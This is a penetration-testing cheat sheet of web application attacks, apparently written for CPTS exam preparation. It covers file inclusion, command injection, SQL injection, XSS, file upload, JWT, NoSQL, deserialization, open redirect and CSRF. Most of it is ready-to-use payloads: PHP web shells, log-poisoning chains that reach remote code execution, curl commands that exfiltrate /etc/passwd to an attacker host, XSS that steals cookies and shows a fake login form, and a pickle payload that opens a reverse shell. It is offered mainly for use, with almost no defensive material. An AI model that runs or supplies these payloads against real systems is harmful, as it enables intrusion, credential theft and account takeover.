# PHASE 3: WEB APPLICATION ATTACKS

## 3.1 - File Inclusion (LFI/RFI)
```
Decision: Is user input used in file paths?
├── Yes → Test for LFI
│   ├── Basic: ../../../etc/passwd
│   ├── Encoded: ..%252f..%252f..%252fetc/passwd
│   ├── PHP filter: php://filter/convert.base64-encode/resource=index.php
│   ├── PHP input: php://input (POST body as code)
│   ├── Log poisoning: /var/log/apache2/access.log
│   └── SSH log poisoning: /var/log/auth.log
├── RFI possible? → http://attacker/shell.txt
└── No → Move to next attack
```

**LFI Bypass Cheatsheet:**
```
../          ..%252f     ..%c0%af     ..%255c
....//       ..\/        ..;/         %00 (null byte)
..././       ....\/\/    ..;/         ....//
php://filter/convert.base64-encode/resource=
expect://id
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpPz4=
```

**Read vs Execute Functions (Critical Distinction):**
```
PHP:
├── include()/include_once() → READ + EXECUTE + REMOTE URL
├── require()/require_once() → READ + EXECUTE (no remote)
├── file_get_contents() → READ only + REMOTE URL
└── fopen()/file() → READ only (no remote)

NodeJS:
├── fs.readFile() → READ only
├── fs.sendFile() → READ only
└── res.render() → READ + EXECUTE

Java:
├── include → READ only
└── import → READ + EXECUTE + REMOTE URL

.NET:
├── @Html.Partial() → READ only
├── Response.WriteFile() → READ only
└── include → READ + EXECUTE + REMOTE URL
```

**Second-Order LFI Attacks:**
```
Poison database entry with LFI payload (e.g., username = ../../../etc/passwd)
→ Another function uses that entry to load file
→ Example: /profile/$username/avatar.png → includes our malicious path
→ Test: Register with LFI payload as username, then access avatar/profile endpoints
```

**allow_url_include Check (Critical for RFI/data/input/expect):**
```bash
# Read PHP config via LFI
curl "http://target/page.php?file=php://filter/convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
# Decode and grep for allow_url_include
echo 'BASE64...' | base64 -d | grep allow_url_include
```

**PHP Session Poisoning:**
```bash
# Session file: /var/lib/php/sessions/sess_<PHPSESSID>
# Get PHPSESSID from cookie

# Step 1: Poison session (inject PHP code into session via parameter)
curl "http://target/page.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E"

# Step 2: Include session file
curl "http://target/page.php?language=/var/lib/php/sessions/sess_<PHPSESSID>&cmd=id"

# Note: Must re-poison after each inclusion (gets overwritten)
```

**Log Poisoning Steps:**
```bash
# Apache log poisoning
# 1. Inject PHP into User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target/
# 2. Include log file
curl "http://target/page.php?file=/var/log/apache2/access.log&cmd=id"

# SSH log poisoning (auth.log)
ssh '<?php system($_GET["cmd"]); ?>'@target
# Then include /var/log/auth.log
curl "http://target/page.php?file=/var/log/auth.log&cmd=id"

# Nginx log poisoning
curl -A "<?php system(\$_GET['cmd']); ?>" http://target/
curl "http://target/page.php?file=/var/log/nginx/access.log&cmd=id"

# /proc/self/environ poisoning
curl -A "<?php system(\$_GET['cmd']); ?>" http://target/
curl "http://target/page.php?file=/proc/self/environ&cmd=id"
```

**LFI + File Upload = RCE:**
```bash
# Method 1: Image with PHP code
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
# Upload, then include
curl "http://target/page.php?language=./profile_images/shell.gif&cmd=id"

# Method 2: ZIP wrapper
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
curl "http://target/page.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id"

# Method 3: Phar wrapper (alternative to ZIP)
# Create phar with web shell, rename to .jpg, upload
curl "http://target/page.php?language=phar://./profile_images/shell.jpg%23shell.txt&cmd=id"
```

**LFI Webroot Fuzzing:**
```bash
# Find webroot path
ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
  -u 'http://target/page.php?language=../../../../FUZZ/index.php' -fs 2287

# Find server files
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-WordList-Linux.txt:FUZZ \
  -u 'http://target/page.php?language=../../../../FUZZ' -fs 2287
```

## 3.2 - Command Injection
```
Decision: Is user input passed to system commands?
├── Yes → Test injection payloads
│   ├── Basic: ;id, |id, ||id, &&id, `id`, $(id)
│   ├── Blind: time-based (sleep 5), OOB (curl attacker)
│   └── Filtered? → encoding, alternate syntax
└── No → Move to next attack
```

**Command Injection Payloads:**
```bash
# Injection operators (URL-encoded)
;       %3b      # Semicolon - both commands
%0a     %0a      # Newline - both commands (often not blacklisted!)
&       %26      # Background - both (second shown first)
|       %7c      # Pipe - both (only second shown)
&&      %26%26   # AND - both (only if first succeeds)
||      %7c%7c   # OR - second (only if first fails)
` `     %60%60   # Sub-shell (Linux only)
$()     %24%28%29 # Sub-shell (Linux only)

# Basic payloads
;id
|id
||id
&&id
`id`
$(id)

# SPACE BYPASS (if space filtered)
127.0.0.1%0a%09id                    # Tab (%09) instead of space
127.0.0.1%0a${IFS}id                 # ${IFS} = space+tab
127.0.0.1%0a{id}                     # Brace expansion: {ls,-la}
127.0.0.1%0a${IFS}${PATH:0:1}home    # Combine with slash bypass

# SLASH BYPASS (if / filtered)
${PATH:0:1}                          # Extracts / from PATH
${HOME:0:1}                          # Extracts / from HOME
${PWD:0:1}                           # Extracts / from PWD
$(tr '!-}' '"-~'<<<[)                # Character shifting → \

# SEMICOLON BYPASS (if ; filtered)
${LS_COLORS:10:1}                    # Extracts ; from LS_COLORS
%0a                                  # Newline as injection operator

# COMMAND BLACKLIST BYPASS
w'h'o'am'i                           # Quote insertion (even number, same type)
w"h"o"am"i                           # Double quote insertion
w\ho\am\i                            # Backslash insertion (Linux only)
who$@ami                             # $@ insertion (Linux only)
who^ami                              # Caret insertion (Windows only)

# CASE MANIPULATION
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")    # Linux: tr to lowercase
$(a="WhOaMi";printf %s "${a,,}")     # Linux: bash parameter expansion
WhOaMi                               # Windows: case-insensitive

# REVERSED COMMANDS
$(rev<<<'imaohw')                    # Linux: reverse whoami
iex "$('imaohw'[-1..-20] -join '')"  # Windows: PowerShell reverse

# BASE64 ENCODED
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)  # Linux
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"  # Windows

# ENCODING & OBFUSCATION
$(printf '\x69\x64')                 # Hex encoding
/???/??t /???/p??s??                 # Glob-based bypass

# WILDCARDS & REGEX
/bin/ca? /etc/passwd                 # ? wildcard
/bin/c[a]t /etc/passwd               # [] wildcard

# EVASION TOOLS
# Bashfuscator (Linux):
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
# DOSfuscation (Windows): interactive PowerShell obfuscation

# Data exfiltration
;cat /etc/passwd | curl -X POST -d @- http://attacker/
;curl http://attacker/$(cat /etc/passwd | base64)
;wget http://attacker/$(whoami)

# BLIND DETECTION
;sleep 5                              # Time-based
;curl http://attacker/                # OOB
;ping -c 5 attacker                   # ICMP
```

## 3.3 - SQL Injection
```
Decision: Is user input in SQL queries?
├── Error-based → Extract via error messages
├── Union-based → UNION SELECT to extract data
├── Boolean-based → True/False to infer data
├── Time-based → SLEEP/WAITFOR to infer data
├── Stacked queries → Multiple statements
└── No → Move to next attack
```

**SQLi Detection:**
```sql
' OR 1=1--
" OR 1=1--
' OR '1'='1
admin'--
1' ORDER BY 1--    # Increase number until error
1' UNION SELECT NULL--  # Add NULLs until column count matches
```

**MySQL Enumeration:**
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--
' UNION SELECT "<?php system($_GET['cmd']); ?>",NULL INTO OUTFILE '/var/www/html/shell.php'--
```

**MSSQL Enumeration:**
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--
'; EXEC xp_cmdshell 'whoami'--
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

**SQLMap:**
```bash
# Basic
sqlmap -u "http://target/page?id=1" --batch

# POST request
sqlmap -u "http://target/login" --data="user=admin&pass=test" --batch

# With cookie
sqlmap -u "http://target/page?id=1" --cookie="session=abc123" --batch

# Enumerate databases
sqlmap -u "http://target/page?id=1" --dbs --batch

# Enumerate tables
sqlmap -u "http://target/page?id=1" -D <database> --tables --batch

# Dump table
sqlmap -u "http://target/page?id=1" -D <database> -T <table> --dump --batch

# OS shell (if possible)
sqlmap -u "http://target/page?id=1" --os-shell --batch

# File read
sqlmap -u "http://target/page?id=1" --file-read="/etc/passwd" --batch

# Tamper scripts (WAF bypass)
sqlmap -u "http://target/page?id=1" --tamper=space2comment,between --batch
```

## 3.4 - Cross-Site Scripting (XSS)
```
Decision: Is user input reflected in HTML?
├── Reflected → Script in URL/parameter
├── Stored → Script saved in database
├── DOM-based → Client-side manipulation
└── No → Move to next attack
```

**XSS Payloads:**
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"><script>alert('XSS')</script>
'onmouseover='alert("XSS")'
javascript:alert('XSS')
```

**Blind XSS (can't see rendered output):**
```html
<!-- Load remote script per field name, check listener for hits -->
<script src=http://ATTACKER/fieldname></script>
<img src=x onerror=fetch('http://ATTACKER/?c='+document.cookie)>
```

**Cookie Stealing (stored XSS):**
```html
<!-- Inject in stored field (comment, profile, etc.) -->
<script>new Image().src='http://ATTACKER/?c='+document.cookie</script>
<!-- Attacker listener: python3 -m http.server 8080 -->
```

**XSS Phishing (fake login form):**
```html
<!-- Inject into stored XSS field -->
<script>
document.write('<h3>Session Expired</h3><form action=http://ATTACKER/login><input name=user placeholder=Username><input name=pass type=password placeholder=Password><button>Login</button></form>');
document.getElementById('originalForm').remove();
</script>
```

**SVG XXE via file upload:**
```xml
<!-- Save as .svg, upload as image -->
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <text>&xxe;</text>
</svg>
```

**Image Metadata XSS (exiftool):**
```bash
# Inject XSS into image metadata (displayed by app)
exiftool -Comment=' "><img src=1 onerror=alert(1)>' image.jpg
# Or into any EXIF field the app renders
```

## 3.5 - File Upload Attacks
```
Decision: Can we upload files?
├── Yes → What restrictions exist?
│   ├── Extension bypass: .php5, .phtml, .pht, .php.jpg
│   ├── Content-Type: Change to image/jpeg
│   ├── Double extension: shell.php.jpg
│   ├── Reverse double ext: shell.php.jpg (Apache misconfig, regex lacks $)
│   ├── Null byte: shell.php%00.jpg (PHP < 5.3)
│   ├── Magic bytes: GIF89a header
│   ├── Race condition: Upload and access simultaneously
│   ├── SVG upload → XXE or XSS via SVG XML
│   ├── Image metadata → exiftool XSS injection
│   └── Character injection fuzzing → %20, %0a, %00, /, .\, : before ext
├── Upload to web-accessible dir? → Access and execute
└── No → Move to next attack
```

**Character Injection Filename Fuzzing:**
```bash
# Test special chars before/after extension
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' ':'; do
  for ext in '.php' '.phps' '.phtml'; do
    echo "shell${char}${ext}.jpg"
  done
done
# Use Burp Intruder to test each variation
```

**Web Shells:**
```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php if(isset($_REQUEST['cmd'])){echo "<pre>";$cmd = ($_REQUEST['cmd']);system($cmd);echo "</pre>";die;}?>
```

## 3.6 - Login Brute Force (Web Forms)

**Hydra http-post-form:**
```bash
# Identify form parameters (inspect HTML or Burp)
# Success condition: S=302 or S=Dashboard
# Failure condition: F=Invalid credentials

hydra -L users.txt -P passwords.txt <target> http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
hydra -l admin -P passwords.txt <target> http-post-form "/login:user=^USER^&pass=^PASS^:S=302"

# Basic HTTP Auth
hydra -l admin -P passwords.txt <target> http-get /
```

## 3.7 - XXE (XML External Entity)
```
Decision: Does app parse XML/SVG/DOCX input?
├── Yes → Inject external entity
│   ├── File read: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
│   ├── PHP filter: <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
│   ├── SSRF: <!ENTITY xxe SYSTEM "http://internal-host:8080/">
│   ├── Blind OOB: <!ENTITY xxe SYSTEM "http://attacker/xxe">
│   ├── SVG upload: <svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><text>&xxe;</text></svg>
│   └── Error-based: Use invalid entity to leak in error message
└── No → Move to next attack
```

## 3.8 - SSRF (Server-Side Request Forgery)
```
Decision: Does app fetch URLs on our behalf?
├── Yes → Test internal access
│   ├── Basic: http://127.0.0.1, http://localhost, http://169.254.169.254 (cloud metadata)
│   ├── Bypass filters:
│   │   ├── Decimal: http://2130706433 (127.0.0.1)
│   │   ├── Hex: http://0x7f000001
│   │   ├── Octal: http://0177.0.0.1
│   │   ├── DNS rebinding: http://attacker.com → resolves to 127.0.0.1
│   │   ├── Redirect: http://attacker/redirect → 302 to http://internal
│   │   └── URL parsing: http://attacker@127.0.0.1, http://127.0.0.1#@attacker
│   ├── Cloud metadata: http://169.254.169.254/latest/meta-data/
│   ├── Internal port scan: http://127.0.0.1:PORT
│   └── File read: file:///etc/passwd, gopher://, dict://
└── No → Move to next attack
```

## 3.9 - IDOR (Insecure Direct Object Reference)
```
Decision: Can we manipulate object references (uid, file_id, etc.)?
├── Yes → Test access control
│   ├── Sequential: Change uid=1 to uid=2
│   ├── Encoded: base64 decode → modify → re-encode
│   ├── Hashed: Check if hash is calculated client-side (JS)
│   │   └── Look for CryptoJS.MD5(btoa(uid)) in frontend code
│   ├── API: GET/PUT/DELETE other users' endpoints
│   ├── Mass enum: Loop through IDs to dump all data
│   ├── Role escalation: Change role parameter to admin
│   └── Chaining: Leak admin UUID via GET IDOR → use with PUT to change email → reset password → admin
└── No → Move to next attack
```

**IDOR Hash Reversal (front-end code review):**
```bash
# If app uses hashed IDs, check JS source for hash algorithm
# Common pattern: CryptoJS.MD5(btoa(uid)) or btoa(uid)
# Reverse: atob(hash) → uid, then enumerate
# Mass enumerate: for i in $(seq 1 100); do curl -sOJ URL?hash=$(echo -n $i | base64 | md5sum | cut -d' ' -f1); done
```

## 3.10 - HTTP Verb Tampering & Header Bypass
```
Decision: Is auth/filter only on GET/POST?
├── Yes → Try alternate verbs
│   ├── HEAD: May bypass auth (no body returned)
│   ├── PUT/DELETE/PATCH: May bypass filters
│   ├── OPTIONS: Check allowed methods
│   ├── TRACE/TRACK: May bypass auth (XST attack)
│   └── Burp: Right-click → Change Request Method
├── Header-based bypass? → Inject trusted headers
│   ├── X-Custom-IP-Authorization: 127.0.0.1
│   ├── X-Forwarded-For: 127.0.0.1
│   ├── X-Original-URL: /admin
│   ├── X-Rewrite-URL: /admin
│   └── X-Real-IP: 127.0.0.1
└── No → Move to next attack
```

**PDF Generation XSS/SSRF:**
```
If app generates PDFs from user input:
├── Inject JavaScript to read local files
│   ├── <script>xhr=new XMLHttpRequest();xhr.open('GET','file:///etc/passwd',false);xhr.send();document.write(xhr.responseText);</script>
│   └── <iframe src="file:///etc/passwd"></iframe>
└── SSRF via PDF renderer
    └── <script>xhr.open('GET','http://internal:8080/admin',false);xhr.send();document.write(xhr.responseText);</script>
```

## 3.11 - DOM XSS Source/Sink Reference
> XSS general payloads in §3.4. DOM-specific reference below.
```
Sources (user-controlled): document.URL, location.hash, location.search, document.referrer, window.name, postMessage data
Sinks (dangerous):         innerHTML, outerHTML, document.write, eval, Function(), setTimeout(str), setInterval(str), location.href, jQuery .html()

DOM XSS test: append #<svg/onload=alert(1)> to URL → triggers if hash hits sink
```

## 3.12 - JWT (JSON Web Token) Attacks
```
Decision: App uses JWT (header.payload.signature)?
├── alg:none → strip signature, set "alg":"none"
├── HS256 → RS256 confusion → sign HS256 with public key as secret
├── Weak HMAC secret → crack offline (hashcat -m 16500)
├── kid header injection → SQLi / path traversal in kid lookup
├── jku/x5u URL injection → host attacker JWKS
├── Embedded jwk → swap with attacker key
└── No → skip
```

**Decode + inspect:**
```bash
# Manual: base64 -d each part (header, payload)
echo '<header_b64>' | base64 -d
echo '<payload_b64>' | base64 -d

# jwt_tool (all-in-one)
python3 jwt_tool.py <JWT>                       # Decode + analyze
python3 jwt_tool.py <JWT> -X a                  # alg:none attack
python3 jwt_tool.py <JWT> -X k -pk public.pem   # HS256→RS256 confusion (use pubkey as HMAC secret)
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt   # Dictionary attack HMAC
python3 jwt_tool.py <JWT> -I -pc 'role' -pv 'admin'    # Tamper claim
```

**Crack weak HMAC secret:**
```bash
# Hashcat mode 16500 = JWT
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
# John alt
john --format=HMAC-SHA256 jwt.txt --wordlist=rockyou.txt
```

**HS256 → RS256 algorithm confusion (server validates with public key as HMAC secret):**
```bash
# 1. Get server public key (often /.well-known/jwks.json or /jwks)
curl http://target/.well-known/jwks.json
# 2. Convert JWKS → PEM
# 3. Forge: header.alg=HS256, sign payload with PEM as HMAC secret
python3 jwt_tool.py <JWT> -X k -pk public.pem
```

**kid header injection (when server reads kid as file path or SQL lookup):**
```
Header: {"alg":"HS256","kid":"../../../../dev/null"}
→ Server reads /dev/null as HMAC key → empty key → forge with empty secret

Header: {"alg":"HS256","kid":"key' UNION SELECT 'attacker_secret"}
→ SQLi in kid lookup
```

## 3.13 - .htaccess + Filename Injection (Upload extras)
> Full upload attack tree in §3.5. Extras below.
```
.htaccess upload (Apache, when allowed):
  AddType application/x-httpd-php .jpg     # makes .jpg execute as PHP
  → upload .htaccess, then shell.jpg with PHP code → access shell.jpg

Filename injection (when filename used in shell command):
  $(whoami).jpg          # command substitution
  `id`.jpg               # backtick exec
  ;curl ATTACKER/$(id);.jpg

Race condition upload:
  while true; do curl -F 'file=@shell.php' http://t/upload; done &
  while true; do curl http://t/uploads/shell.php; done    # hit before deletion
```

## 3.14 - LDAP Injection
> When web app passes user input into LDAP filter. Bypass auth, dump directory.
> CPTS Common Apps module covers this. nmap will show port 389/636 open with web app on 80.

```
Decision: App authenticates via LDAP backend?
├── Yes → Test special chars in user/pass fields
│   ├── *           → wildcard match any
│   ├── (cn=*)      → always-true filter
│   ├── *)(uid=*    → close filter early
│   ├── )(&(...))(  → break/inject sub-filter
│   └── )(|(uid=*   → OR injection
└── No → skip
```

**Detection (no creds needed):**
```bash
# Username = *  /  password = *  → bypass auth if vulnerable
# Or in either field:
#   *)(uid=*
#   *)(&
#   *)(|(uid=*))
#   admin)(&)
```

**Filter injection (search query):**
```
Original filter: (&(objectClass=user)(sAMAccountName=$user)(userPassword=$pass))

Inject in $user field with value:  *
Resulting filter: (&(objectClass=user)(sAMAccountName=*)(userPassword=dummy))
→ matches ANY user with password "dummy"

Inject in $pass field with value:  *
Resulting filter: (&(objectClass=user)(sAMAccountName=dummy)(userPassword=*))
→ matches dummy with ANY password

Combo: user=*  pass=*    → full auth bypass
```

**Blind LDAP injection (boolean inference):**
```
Inject *)(uid=a*  →  app behavior differs based on whether user starts with 'a'
Loop alphabet → dump usernames
```

**Mitigation reminder (for report):** sanitize *, (, ), |, &, NUL bytes; use parameterised query libraries; least-privileged bind account.

## 3.15 - Mass Assignment
> Framework auto-binds HTTP params to object attributes. Add hidden attribute → privilege escalation / pending-approval bypass.
> CPTS Common Apps module. Common in Ruby on Rails, Django, Spring, Flask.

```
Decision: Registration/profile-update form?
├── Yes → Submit form normally, then add extra fields not shown in UI:
│   ├── admin=true
│   ├── role=admin
│   ├── is_admin=1
│   ├── verified=true
│   ├── confirmed=true / approved=true / active=true
│   ├── userid=1                  # impersonate user 1 on update
│   ├── permission_level=999
│   ├── balance=99999
│   └── group_id=0 (root group in some apps)
└── No → skip
```

**Exploit workflow:**
```bash
# 1. Submit normal registration
curl -d 'username=test&password=Test123!&email=t@t' http://target/register

# 2. Add hidden field — try every variation
curl -d 'username=test2&password=Test123!&email=t2@t&admin=true' http://target/register
curl -d 'username=test3&password=Test123!&email=t3@t&confirmed=1' http://target/register
curl -d 'username=test4&password=Test123!&email=t4@t&role=administrator' http://target/register

# 3. Burp Repeater — fuzz parameter names from common-attrs wordlist
# /usr/share/seclists/Discovery/Web-Content/api/objects-attributes.txt

# 4. JSON variant
curl -X POST http://target/api/users -H 'Content-Type: application/json' \
  -d '{"username":"test5","password":"Test123!","admin":true,"role":"admin"}'

# 5. Profile-update IDOR-ish — change other user's role
curl -X PUT http://target/api/users/me -H 'Cookie: session=...' \
  -d '{"email":"new@t","role":"admin"}'
```

**Common attribute name wordlist:**
```
admin, is_admin, isAdmin, role, roles, permission, permissions, level,
priv, privilege, group, group_id, approved, confirmed, verified, active,
status, type, account_type, user_type, balance, credits, points, vip,
superuser, staff, owner, deleted, is_deleted, password, password_hash
```

## 3.16 - NoSQL Injection (MongoDB / CouchDB / Redis-backed)
> When app uses MongoDB / CouchDB and passes user input to query operators.
> Detection differs from SQLi — uses JSON / operator injection, not quote escaping.

```
Decision: App backend is MongoDB / CouchDB?
├── Yes → Test operator injection in JSON body / URL params
│   ├── Auth bypass: {"username":{"$ne":null},"password":{"$ne":null}}
│   ├── Auth bypass: {"username":"admin","password":{"$gt":""}}
│   ├── Regex extraction: {"username":"admin","password":{"$regex":"^a"}}
│   ├── Where injection: {"$where":"this.password.match(/^a/)"}
│   ├── Time-based: {"$where":"sleep(5000)"}
│   └── PHP-Mongo: ?username[$ne]=&password[$ne]=  (form-encoded operators)
└── No → skip
```

**Auth bypass payloads (POST body, app/json):**
```json
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":"admin","password":{"$ne":"x"}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":{"$in":["admin","root","administrator"]},"password":{"$ne":null}}
```

**Auth bypass (PHP-style array operators in form/URL):**
```
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username[$ne]=&password[$ne]=
username[$regex]=^adm&password[$ne]=
```

**Blind data extraction via regex (char-by-char):**
```bash
# Iterate alphabet → if response length differs, char matched
for c in {a..z} {A..Z} {0..9}; do
  curl -s -X POST http://target/login \
    -H 'Content-Type: application/json' \
    -d "{\"username\":\"admin\",\"password\":{\"\$regex\":\"^${c}\"}}" \
    | grep -q "success" && echo "match: $c"
done
```

**$where JavaScript injection (MongoDB <4.4 + Node.js apps):**
```
?username=admin&password=' || '1'=='1
?search=admin'; return true; var x='
?search=admin'; sleep(5000); '
```

**Tools:**
```bash
# NoSQLMap (sqlmap-style automation)
python3 nosqlmap.py
# Menu → 1 Set options → 4 Manage attacks → MongoDB

# Mongo-bigfuck (auth bypass + extraction)
python3 mongoaudit.py <target> 27017
```

**CouchDB injection (CVE-2017-12635 — privilege escalation via duplicate keys):**
```bash
curl -X PUT http://<target>:5984/_users/org.couchdb.user:admin \
  -H "Content-Type: application/json" \
  -d '{"type":"user","name":"admin","roles":["_admin"],"roles":[],"password":"pwn"}'
# Duplicate roles key — first wins for parsing, second for validation → privilege grant
```

## 3.17 - Insecure Deserialization
> User-controlled serialized blob → app deserializes → gadget chain → RCE.
> CPTS Common Apps module covers Java + PHP deserialization.

```
Decision: App accepts serialized objects?
├── Java   → look for: rO0AB (base64 of 0xAC 0xED magic), ViewState, RMI
├── PHP    → look for: O:<n>:"ClassName": pattern, phar:// wrapper
├── Python → look for: pickle blobs (gASV...), base64 starting with "gA"
├── .NET   → look for: AAEAAAD///// (BinaryFormatter magic), ViewState
├── Ruby   → look for: Marshal data, YAML.load on user input
└── No → skip
```

**Java — ysoserial (gadget chain generator):**
```bash
# Identify Java deserialization endpoint (Burp extension: Java Deserialization Scanner)
# Magic bytes: AC ED 00 05 (raw) or rO0AB (base64)

# Pick gadget based on libraries in classpath
java -jar ysoserial.jar
# Common gadgets: CommonsCollections1-7, Spring1-2, Hibernate1-2, JRMPClient, URLDNS (detection)

# Detection: URLDNS (causes DNS lookup to attacker — no RCE, just confirm vuln)
java -jar ysoserial.jar URLDNS "http://<attacker>.burpcollab.net/" | base64 -w0

# RCE: CommonsCollections5 (most common)
java -jar ysoserial.jar CommonsCollections5 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}' > payload.bin

# Send via Burp Repeater — content-type: application/x-java-serialized-object
curl -X POST http://target/endpoint --data-binary @payload.bin -H "Content-Type: application/x-java-serialized-object"
```

**PHP — unserialize() abuse + Phar wrapper:**
```php
// Vulnerable pattern: unserialize($_COOKIE['data'])
// Build payload with PHPGGC (PHP gadget chain generator)
phpggc Laravel/RCE5 'system' 'id' -b   // base64 output for cookie
phpggc Symfony/RCE4 system id          // raw
phpggc Drupal/RCE -b system id

// Phar deserialization (no explicit unserialize() needed)
// Trigger: file_exists("phar://uploaded.jpg") on any file_*() function
phpggc -p phar -f Monolog/RCE1 system 'id' shell.phar
mv shell.phar shell.jpg
// Upload as image, then trigger: file_exists("phar://./uploads/shell.jpg")
```

**Python pickle (always RCE if deserialized):**
```python
import pickle, base64, os
class RCE:
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"',))
print(base64.b64encode(pickle.dumps(RCE())).decode())
# Send as cookie / body / parameter that gets pickled
```

**.NET ViewState / BinaryFormatter — ysoserial.net:**
```powershell
# ysoserial.net
.\ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "powershell -e <base64>"
.\ysoserial.exe -g WindowsIdentity -f Json.Net -c "calc.exe"

# ViewState (needs __VIEWSTATEGENERATOR + machineKey)
# If machineKey leaked (web.config disclosure) → RCE
.\ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  -c "powershell -e <base64>" \
  --path="/page.aspx" --apppath="/" \
  --validationalg="SHA1" --validationkey="<key>"
```

**Ruby — Marshal / YAML:**
```ruby
# Marshal.load on user input = RCE
# Universal Marshal gadget — see GitHub jcsxv/ruby-marshal-poc

# YAML.load (Rails <5) — !ruby/object tag abuse
yaml_payload="--- !ruby/object:Gem::Installer\n  i: x\n"
```

## 3.18 - Open Redirect
> User-controlled URL in redirect param → arbitrary external redirect.
> Standalone severity = Low. Chains to OAuth token theft / SSRF / phishing.

```
Decision: App redirects based on user param? (returnTo, next, redirect, url, callback)
├── Yes → Inject attacker-controlled URL
│   ├── Direct: ?next=https://attacker.com
│   ├── Protocol-relative: ?next=//attacker.com
│   ├── Backslash bypass: ?next=https:\\attacker.com  or  ?next=\\attacker.com
│   ├── @-trick: ?next=https://target.com@attacker.com
│   ├── Whitelist bypass: ?next=https://attacker.com.target.com  or  attacker.com#target.com
│   ├── Path traversal: ?next=/..//attacker.com
│   ├── URL encoding: ?next=https%3A%2F%2Fattacker.com
│   ├── CRLF chain: ?next=https://target.com%0d%0a%0d%0a<script>...
│   └── Data scheme: ?next=data:text/html,<script>alert(1)</script>
└── No → skip
```

**Bypass table (whitelisted domains):**
```
Target whitelist: must contain "target.com"

attacker.com?target.com          ← if regex misses anchor
target.com.attacker.com          ← prefix-only check
attacker.com/target.com          ← path-only check
https://attacker.com#@target.com ← fragment confuses parser
//attacker.com\@target.com       ← Node.js URL parser quirk
javascript:alert(1)//target.com  ← scheme check missed
```

**Chains:**
```
Open Redirect + OAuth → steal access_token in URL fragment
  oauth flow returns to redirect_uri with #access_token=...
  if redirect_uri whitelist permissive → attacker.com receives token
Open Redirect + SAML → relay SAMLResponse to attacker IdP-consumer
Open Redirect + CSRF token leak via Referer
Open Redirect + Cache poisoning (web cache deception)
```

## 3.19 - CSRF (Cross-Site Request Forgery)
> Victim's browser carries cookies on cross-origin request → state change without consent.
> Detection: state-change endpoint with no CSRF token / weak token / token not validated.

```
Decision: Sensitive state-change action?
├── No CSRF token? → trivial CSRF, build PoC HTML
├── Token present?
│   ├── Token not validated? → omit token in PoC, send anyway
│   ├── Token not bound to user? → use attacker's token
│   ├── Token in cookie only (double-submit broken)? → strip cookie check
│   ├── Token validated only on POST? → switch to GET
│   ├── SameSite=Lax / None? → embed in iframe / form submit
│   └── Method bypass: PUT/DELETE not protected
├── JSON body? → form-data CSRF via Content-Type: text/plain trick
└── No → skip
```

**PoC HTML (simple form CSRF):**
```html
<html><body>
<form action="https://target.com/changeEmail" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
</body></html>
<!-- Host on attacker site, victim visits → email changed -->
```

**JSON CSRF (via text/plain Content-Type confusion):**
```html
<form action="https://target/api/profile" method="POST" enctype="text/plain">
  <input name='{"email":"a@evil.com","x":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
<!-- Body sent: {"email":"a@evil.com","x":"="} — parses as JSON -->
```

**CSRF token bypass checks (test each):**
```
1. Remove token entirely → does it work?
2. Use empty token (token=) → does it work?
3. Use attacker's own valid token on victim's session → does it work?
4. Modify token (flip one char) → does request still succeed?
5. Change request method (POST → GET) → does CSRF protection follow?
6. Re-use token from prior request (replay)
```

**SameSite bypass tactics:**
```
SameSite=Lax allows top-level GET cross-site → use <a href=...> + GET endpoint
SameSite=None requires Secure flag → HTTPS only
SameSite=Strict — chain with XSS / subdomain takeover for same-origin
```

## 3.20 - CRLF Injection / HTTP Response Splitting
> Inject \r\n into header context → forge headers / split response → cache poisoning / XSS.

```
Decision: User input reflected in HTTP response header?
